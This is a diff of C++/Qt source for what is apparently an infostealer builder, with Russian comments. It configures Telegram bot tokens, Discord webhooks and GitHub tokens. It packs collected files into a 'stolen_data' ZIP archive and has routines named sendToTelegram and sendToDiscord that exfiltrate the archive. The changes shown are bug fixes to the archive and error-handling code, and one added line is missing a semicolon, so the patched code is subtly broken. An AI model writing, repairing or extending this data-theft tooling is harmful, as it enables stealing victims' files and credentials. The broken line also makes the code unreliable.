@@ -200,7 +200,7 @@ MainWindow::MainWindow(QWidget *parent)
     tokenLineEdit = ui->tokenLineEdit;
     chatIdLineEdit = ui->chatIdLineEdit;
     discordWebhookLineEdit = ui->discordWebhookLineEdit;
-    fileNameLineEdit = ui->filenameLineEdit;
+    fileNameLineEdit = ui->fileNameLineEdit
     iconPathLineEdit = ui->iconPathLineEdit;
     githubTokenLineEdit = ui->githubTokenLineEdit;
     githubRepoLineEdit = ui->githubRepoLineEdit;
@@ -1564,12 +1564,12 @@ std::string MainWindow::archiveData(const std::string& dir, const std::vector<st
     }
 
     std::string zipPath = dir + "\\stolen_data_" + generateRandomString(8) + ".zip";
-    zip_error_t err;  // Убираем zip_error_init, так как zip_open сам инициализирует err
+    zip_error_t err;
+    zip_error_init(&err); // Явная инициализация для совместимости со старыми версиями libzip
 
-    // Открытие архива с передачей указателя на zip_error_t
     zip_t* zip = zip_open(zipPath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, &err);
     if (!zip) {
-        emitLog("Ошибка: Не удалось создать ZIP-архив: " + QString(zip_error_strerror(&err)));  // Исправлено: передаём &err
+        emitLog("Ошибка: Не удалось создать ZIP-архив: " + QString(zip_error_strerror(&err)));
         zip_error_fini(&err);
         return "";
     }
@@ -1605,26 +1605,26 @@ std::string MainWindow::archiveData(const std::string& dir, const std::vector<st
         return "";
     }
 
-    // Сохраняем ошибку перед закрытием, чтобы избежать UB после zip_close
+    // Сохраняем ошибку перед закрытием
     zip_error_t closeErr;
     zip_error_init(&closeErr);
     if (zip_close(zip) < 0) {
-        zip_error_t* zipErr = zip_get_error(zip);  // Получаем ошибку до закрытия
-        zip_error_set(&closeErr, zip_error_code_zip(zipErr), zip_error_code_system(zipErr));  // Копируем ошибку
+        zip_error_t* zipErr = zip_get_error(zip); // Получаем ошибку до освобождения
+        zip_error_set(&closeErr, zip_error_code_zip(zipErr), zip_error_code_system(zipErr));
         emitLog("Ошибка закрытия ZIP-архива: " + QString(zip_error_strerror(&closeErr)));
-        zip_discard(zip);  // Отбрасываем изменения
+        zip_discard(zip);
         zip_error_fini(&closeErr);
         zip_error_fini(&err);
         return "";
     }
 
-    zip_error_fini(&err); // Очистка после успешного завершения
+    zip_error_fini(&err); // Очистка основной структуры ошибки
     emitLog("ZIP-архив успешно создан: " + QString::fromStdString(zipPath));
     return zipPath;
 }
 
 // Реализация sendToTelegram
-void MainWindow::sendToTelegram(const std::string& data, const std::vector<std::string>& files) {
+void MainWindow::sendToTelegram(const std::string& /*data*/, const std::vector<std::string>& files) {
     emitLog("Отправка данных через Telegram...");
 
     if (config.telegramBotToken.empty() || config.telegramChatId.empty()) {
@@ -1699,7 +1699,7 @@ void MainWindow::sendToTelegram(const std::string& data, const std::vector<std::
 }
 
 // Реализация sendToDiscord
-void MainWindow::sendToDiscord(const std::string& data, const std::vector<std::string>& files) {
+void MainWindow::sendToDiscord(const std::string& /*data*/, const std::vector<std::string>& files) {
     emitLog("Отправка данных через Discord...");
 
     if (config.discordWebhook.empty()) {
